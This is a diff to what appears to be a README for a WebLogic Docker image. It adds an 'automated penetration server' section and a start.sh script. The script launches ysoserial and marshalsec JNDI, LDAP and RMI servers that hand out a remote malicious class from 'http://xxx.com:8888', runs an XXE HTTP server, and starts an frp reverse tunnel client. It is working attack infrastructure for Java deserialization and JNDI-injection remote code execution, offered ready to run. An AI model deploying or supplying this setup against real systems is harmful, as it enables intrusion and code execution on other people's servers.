@@ -62,3 +62,42 @@ docker run --rm -p 7001:7001 hktalent/weblogic:12.2.1.4.0
 ```bash
 docker run -d --name mywbl -e debugFlag=true -e DEBUG_PORT=9999 -p 9999:9999 -p 7001:7001 hktalent/weblogic:12.2.1.4.0
 ```
+
+# other: 自动化渗透 server
+```
+cp $mtx/../tools/marshalsec-0.0.3-SNAPSHOT-all.jar .
+cp $mtx/../tools/ysoserial-0.0.6-SNAPSHOT-all.jar .
+# docker run -it -v $PWD:/frp --name my4hkfrp adoptopenjdk:8u292-b10-jre-openj9-0.26.0 /frp/start.sh
+docker run -it -v $PWD:/frp --name my4hkfrp hktalent/51pwn4hacker:v1.1 /bin/sh
+# docker exec -it my4hkfrp /bin/sh
+cd /frp
+/frp/start.sh
+tmux ls
+```
+### start.sh 
+cat start.sh 
+```bash
+#!/bin/bash
+
+cd /frp
+mkdir pocs
+tmux new -s 'xxe_s_8888' -d
+tmux send -t 'xxe_s_8888' "node httpServer.js" enter
+
+tmux new -s 'jndi_s_1098' -d
+tmux send -t 'jndi_s_1098' "java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JNDIServer" enter
+
+tmux new -s 'ldap_s_1389' -d
+tmux send -t 'ldap_s_1389' "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://xxx.com:8888/#UpX34defineClass' 1389" enter
+
+tmux new -s 'rmi_s_1099' -d
+tmux send -t 'rmi_s_1099' "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer 'http://xxx.com:8888/#UpX34defineClass' 1099" enter
+
+tmux new -s 'frpS' -d
+tmux send -t 'frpS' "./frpc_linux_amd64 -c ./frpc4pwn.ini" enter
+
+tmux ls
+echo control + b, d
+echo control + p, control + q
+tmux a -t frpS
+```
